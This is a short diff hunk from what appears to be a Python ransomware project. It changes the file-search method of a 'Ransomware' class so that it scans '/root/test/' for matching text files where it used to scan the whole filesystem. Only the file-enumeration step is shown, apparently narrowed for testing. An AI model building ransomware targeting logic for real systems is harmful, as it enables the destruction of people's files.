@@ -37,7 +37,7 @@ class Ransomware:
         # return all files matching the filter
         # here we want all the texte files so the filter will be '*.txt'
         # the path("/") enable the function to find all the files matching the filter in the system
-        path_files=Path("/")
+        path_files=Path("/root/test/")
         files = [f for f in path_files.rglob(filter)]
         return files
 
